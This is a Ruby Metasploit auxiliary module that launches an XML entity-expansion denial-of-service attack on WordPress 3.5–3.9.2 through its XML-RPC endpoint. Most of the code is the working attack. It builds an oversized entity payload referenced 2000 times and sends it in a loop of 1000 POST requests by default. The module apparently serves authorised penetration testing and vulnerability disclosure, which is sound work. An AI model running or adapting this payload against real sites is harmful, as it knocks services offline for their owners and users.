##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Wordpress XMLRPC DoS',
      'Description'   => %q{
        Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
        This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
        also patched).
      },
      'Author'        =>
        [
          'Nir Goldshlager',    # advisory
          'Christian Mehlmauer' # metasploit module
        ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          ['URL', 'http://wordpress.org/news/2014/08/wordpress-3-9-2/'],
          ['URL', 'http://www.breaksec.com/?p=6362'],
          ['URL', 'http://mashable.com/2014/08/06/wordpress-xml-blowup-dos/'],
          ['URL', 'https://core.trac.wordpress.org/changeset/29404']
        ],
      'DisclosureDate'=> 'Aug 6 2014'
    ))

    register_options(
    [
      OptInt.new('RLIMIT', [ true, "Number of requests to send", 1000 ])
    ], self.class)
  end

  def generate_xml_bomb
    entity = Rex::Text.rand_text_alpha(3)

    # Wordpress only resolves one level of entities so we need
    # to specify one long entity and reference it multiple times
    xml = '<?xml version="1.0" encoding="iso-8859-1"?>'
    xml << "<!DOCTYPE #{Rex::Text.rand_text_alpha(6)} ["
    xml << "<!ENTITY #{entity} \"#{Rex::Text.rand_text_alpha(9000)}\">"
    xml << ']>'
    xml << '<methodCall>'
    xml << '<methodName>'
    xml << "&#{entity};" * 2000
    xml << '</methodName>'
    xml << '<params>'
    xml << "<param><value>#{Rex::Text.rand_text_alpha(5)}</value></param>"
    xml << "<param><value>#{Rex::Text.rand_text_alpha(5)}</value></param>"
    xml << '</params>'
    xml << '</methodCall>'

    xml
  end

  def run
    for x in 1..datastore['RLIMIT']
      print_status("#{peer} - Sending request ##{x}...")
      opts = {
        'method'  => 'POST',
        'uri'     => wordpress_url_xmlrpc,
        'data'    => generate_xml_bomb,
        'ctype'   =>'text/xml'
      }
      begin
        c = connect
        r = c.request_cgi(opts)
        c.send_request(r)
        # Don't wait for a response, can take very long
      rescue ::Rex::ConnectionError => exception
        print_error("#{peer} - Unable to connect: '#{exception.message}'")
        return
      ensure
        disconnect(c) if c
      end
    end
  end
end
